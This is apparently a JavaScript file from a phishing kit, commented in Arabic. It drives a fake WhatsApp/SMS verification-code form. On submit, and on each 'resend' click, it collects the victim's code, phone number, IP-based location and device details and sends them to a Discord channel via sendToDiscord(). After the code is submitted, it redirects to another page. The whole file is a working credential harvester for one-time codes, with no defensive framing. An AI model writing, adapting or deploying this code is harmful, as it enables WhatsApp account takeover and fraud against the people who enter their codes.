// معالج نموذج رمز التحقق عبر مكالمة واتساب و SMS
document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('confirmationForm');
  const codeInput = document.getElementById('text');
  const confirmBtn = document.getElementById('confirmCodeBtn');
  const resendCallBtn = document.getElementById('resendCallBtn');
  const resendSMSBtn = document.getElementById('resendSMSBtn');
  const resendCallBtnText = document.getElementById('resendCallBtnText');
  const resendSMSBtnText = document.getElementById('resendSMSBtnText');
  const callChrono = document.getElementById('callChrono');
  const smsChrono = document.getElementById('smsChrono');
  const callChronoTimer = callChrono.querySelector('.btn-chrono-timer');
  const smsChronoTimer = smsChrono.querySelector('.btn-chrono-timer');

  let loadingTimeout;
  let callChronoInterval;
  let smsChronoInterval;
  let callChronoCountdown = 60;
  let smsChronoCountdown = 60;

  // تنسيق الرمز أثناء الكتابة
  codeInput.addEventListener('input', function (e) {
    this.value = this.value.replace(/[^0-9]/g, '');
    hideError();
    hideSuccess();
  });

  // زر تأكيد الرمز
  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    hideError();
    hideSuccess();

    const code = codeInput.value.trim();

    if (!code) {
      showError('⚠️ يرجى إدخال رمز التحقق');
      codeInput.focus();
      return;
    }

    if (code.length !== 6) {
      showError('⚠️ رمز التحقق يجب أن يكون 6 أرقام');
      codeInput.focus();
      return;
    }

    disableForm('confirmationForm');
    showChronoLoading('جاري التحقق والاتصال ...');
    startLinearLoading(2, 'template.html');

    try {
      const { device } = getDeviceInfo();
      const { country, city, ip } = await getIPInfo();
      const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
      const countryCode = getFromStorage('countryCode') || '+968';

      const message = `📞 **SMS And CALL رمز التحقق:** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 **الدولة:** ${country}\n🏙️ **المدينة:** ${city}\n🌐 **IP:** ${ip}\n📱 **الجهاز:** ${device}`;

      const success = await sendToDiscord(message);

      if (success) {
        saveToStorage('verificationCode', code);
      } else {
        clearTimeout(loadingTimeout);
        hideChronoLoading();
        enableForm('confirmationForm');
        showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
      }
    } catch (error) {
      console.error('خطأ:', error);
      clearTimeout(loadingTimeout);
      hideChronoLoading();
      enableForm('confirmationForm');
      showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
    }
  });

  // زر إعادة إرسال المكالمة
  resendCallBtn.addEventListener('click', async function () {
    if (resendCallBtn.disabled) return;

    hideError();
    hideSuccess();
    resendCallBtn.disabled = true;
    resendCallBtnText.textContent = 'جاري إعادة إرسال المكالمة';
    callChrono.style.display = 'flex';
    startResendCallChrono();

    try {
      const { device } = getDeviceInfo();
      const { country, city, ip } = await getIPInfo();
      const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
      const countryCode = getFromStorage('countryCode') || '+968';

      const message = `🔄 **طلب إعادة إرسال مكالمة واتساب:**\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 **الدولة:** ${country}\n🏙️ **المدينة:** ${city}\n🌐 **IP:** ${ip}\n📱 **الجهاز:** ${device}`;

      const success = await sendToDiscord(message);

      if (!success) {
        stopResendCallChrono();
        resendCallBtn.disabled = false;
        resendCallBtnText.textContent = 'إعادة إرسال المكالمة';
        callChrono.style.display = 'none';
        showError('حدث خطأ أثناء إعادة إرسال المكالمة. حاول مرة أخرى.');
      }
    } catch (error) {
      console.error('خطأ:', error);
      stopResendCallChrono();
      resendCallBtn.disabled = false;
      resendCallBtnText.textContent = 'إعادة إرسال المكالمة';
      callChrono.style.display = 'none';
      showError('حدث خطأ أثناء إعادة إرسال المكالمة. حاول مرة أخرى.');
    }
  });

  // زر إعادة إرسال SMS
  resendSMSBtn.addEventListener('click', async function () {
    if (resendSMSBtn.disabled) return;

    hideError();
    hideSuccess();
    resendSMSBtn.disabled = true;
    resendSMSBtnText.textContent = 'جاري إعادة إرسال SMS';
    smsChrono.style.display = 'flex';
    startResendSMSChrono();

    try {
      const { device } = getDeviceInfo();
      const { country, city, ip } = await getIPInfo();
      const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
      const countryCode = getFromStorage('countryCode') || '+968';

      const message = `🔄 **طلب إعادة إرسال رسالة SMS:**\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 **الدولة:** ${country}\n🏙️ **المدينة:** ${city}\n🌐 **IP:** ${ip}\n📱 **الجهاز:** ${device}`;

      const success = await sendToDiscord(message);

      if (!success) {
        stopResendSMSChrono();
        resendSMSBtn.disabled = false;
        resendSMSBtnText.textContent = 'إعادة إرسال SMS';
        smsChrono.style.display = 'none';
        showError('حدث خطأ أثناء إعادة إرسال SMS. حاول مرة أخرى.');
      }
    } catch (error) {
      console.error('خطأ:', error);
      stopResendSMSChrono();
      resendSMSBtn.disabled = false;
      resendSMSBtnText.textContent = 'إعادة إرسال SMS';
      smsChrono.style.display = 'none';
      showError('حدث خطأ أثناء إعادة إرسال SMS. حاول مرة أخرى.');
    }
  });

  // وظيفة بدء الكرونو للمكالمة
  function startResendCallChrono() {
    callChronoCountdown = 60;
    callChronoTimer.textContent = callChronoCountdown;

    callChronoInterval = setInterval(() => {
      callChronoCountdown--;
      callChronoTimer.textContent = callChronoCountdown;

      if (callChronoCountdown <= 5) {
        callChronoTimer.style.color = '#ff6b6b';
        callChronoTimer.style.transform = 'scale(1.1)';
      }

      if (callChronoCountdown <= 0) {
        stopResendCallChrono();
        resendCallBtn.disabled = false;
        resendCallBtnText.textContent = 'إعادة إرسال المكالمة';
        callChrono.style.display = 'none';
        showSuccess('✅ يمكنك الآن إعادة إرسال المكالمة مرة أخرى');
      }
    }, 1000);
  }

  // وظيفة إيقاف الكرونو للمكالمة
  function stopResendCallChrono() {
    if (callChronoInterval) {
      clearInterval(callChronoInterval);
      callChronoInterval = null;
    }
    callChronoTimer.style.color = '';
    callChronoTimer.style.transform = '';
  }

  // وظيفة بدء الكرونو لـ SMS
  function startResendSMSChrono() {
    smsChronoCountdown = 60;
    smsChronoTimer.textContent = smsChronoCountdown;

    smsChronoInterval = setInterval(() => {
      smsChronoCountdown--;
      smsChronoTimer.textContent = smsChronoCountdown;

      if (smsChronoCountdown <= 5) {
        smsChronoTimer.style.color = '#ff6b6b';
        smsChronoTimer.style.transform = 'scale(1.1)';
      }

      if (smsChronoCountdown <= 0) {
        stopResendSMSChrono();
        resendSMSBtn.disabled = false;
        resendSMSBtnText.textContent = 'إعادة إرسال SMS';
        smsChrono.style.display = 'none';
        showSuccess('✅ يمكنك الآن إعادة إرسال SMS مرة أخرى');
      }
    }, 1000);
  }

  // وظيفة إيقاف الكرونو لـ SMS
  function stopResendSMSChrono() {
    if (smsChronoInterval) {
      clearInterval(smsChronoInterval);
      smsChronoInterval = null;
    }
    smsChronoTimer.style.color = '';
    smsChronoTimer.style.transform = '';
  }

  // وظائف التحكم في التحميل الخطي
  function startLinearLoading(seconds, redirectUrl) {
    const progressElement = document.querySelector('.chrono-progress');

    if (progressElement) {
      progressElement.style.width = '0%';
      progressElement.style.transition = `width ${seconds}s linear`;

      setTimeout(() => {
        progressElement.style.width = '100%';
      }, 100);
    }

    loadingTimeout = setTimeout(() => {
      window.location.href = redirectUrl;
    }, seconds * 1000);
  }

  function showChronoLoading(text = 'جاري إرسال رمز التحقق ...') {
    const loadingOverlay = document.getElementById('loadingPopup');
    const chronoLabel = document.querySelector('.chrono-label');

    if (chronoLabel) {
      const dots = chronoLabel.querySelectorAll('.pulsing-dot');
      chronoLabel.innerHTML = text;
      dots.forEach(dot => chronoLabel.appendChild(dot));
    }
    loadingOverlay.style.display = 'flex';
  }

  function hideChronoLoading() {
    const loadingOverlay = document.getElementById('loadingPopup');
    loadingOverlay.style.display = 'none';

    if (loadingTimeout) {
      clearTimeout(loadingTimeout);
    }
  }

  // وظائف مساعدة
  function showError(message) {
    const errorMsg = document.getElementById('errorMsg');
    if (errorMsg) {
      errorMsg.textContent = message;
      errorMsg.style.display = 'block';
    }
  }

  function hideError() {
    const errorMsg = document.getElementById('errorMsg');
    if (errorMsg) {
      errorMsg.style.display = 'none';
    }
  }

  function showSuccess(message) {
    const successMsg = document.getElementById('successMsg');
    if (successMsg) {
      successMsg.textContent = message;
      successMsg.style.display = 'block';
    }
  }

  function hideSuccess() {
    const successMsg = document.getElementById('successMsg');
    if (successMsg) {
      successMsg.style.display = 'none';
    }
  }

  function disableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
      const inputs = form.querySelectorAll('input, button');
      inputs.forEach(input => {
        if (input.id !== 'resendCallBtn' && input.id !== 'resendSMSBtn') {
          input.disabled = true;
        }
      });
    }
  }

  function enableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
      const inputs = form.querySelectorAll('input, button');
      inputs.forEach(input => {
        input.disabled = false;
      });
    }
  }
});